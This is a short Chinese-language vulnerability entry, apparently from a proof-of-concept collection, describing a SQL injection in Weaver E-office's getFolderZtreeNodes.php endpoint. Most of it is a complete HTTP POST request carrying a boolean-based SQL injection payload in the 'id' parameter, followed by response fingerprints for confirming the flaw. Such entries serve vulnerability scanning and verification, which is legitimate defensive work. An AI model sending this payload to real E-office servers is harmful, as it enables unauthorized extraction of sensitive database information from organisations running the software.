﻿# 泛微 E-office getFolderZtreeNodes.php 存在SQL注入漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：泛微旗下标准协同办公平台 e-office产品，全方位覆盖日常办公场景有效提升组织管理与协同效率。E-office getFolderZtreeNodes.php存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。

> 漏洞特征：

> 验证脚本：HTTP

```
POST /general/system/file_folder/purview_new/getFolderZtreeNodes.php HTTP/1.1

id=(SELECT (CASE WHEN (length(database())>0) THEN 1 ELSE (SELECT 9469 UNION SELECT 1668) END))&lv=0&n=&param=eyJmaWxlU29ydCI6bnVsbCwicm9vdCI6eyJuYW1lIjpudWxsLCJjaGVjayI6dHJ1ZSwidXJsIjoiL2dlbmVyYWwvZmlsZV9mb2xkZXIvZmlsZV9uZXcvZmlsZWxpc3QucGhwP1NPUlRfSUQ9MCZGSUxFX1NPUlQ9IiwidGFyZ2V0IjoiZmlsZV9tYWluIiwicmlnaHRDbGljayI6ZmFsc2V9LCJub2RlIjp7InJpZ2h0Q2xpY2siOmZhbHNlLCJ1cmwiOiIvZ2VuZXJhbC9maWxlX2ZvbGRlci9maWxlX25ldy9maWxlbGlzdC5waHAiLCJ0YXJnZXQiOiJmaWxlX21haW4iLCJsb2FkQWxsIjpmYWxzZX0sInNlbGVjdCI6eyJzb3J0aWQiOm51bGwsInNvcnRuYW1lIjpudWxsLCJnZXR3aGF0IjpudWxsLCJmaWxlc29ydCI6bnVsbCwiY2xpY2tGdW4iOiJzZWxlY3RfZm9sZGVyIn19
```

> 响应代码特征：302

> 响应内容特征：folder.class.php

> 上传文件定位：

> 验证文件来源：泛微 E-office getFolderZtreeNodes.php 存在SQL注入漏洞.poc
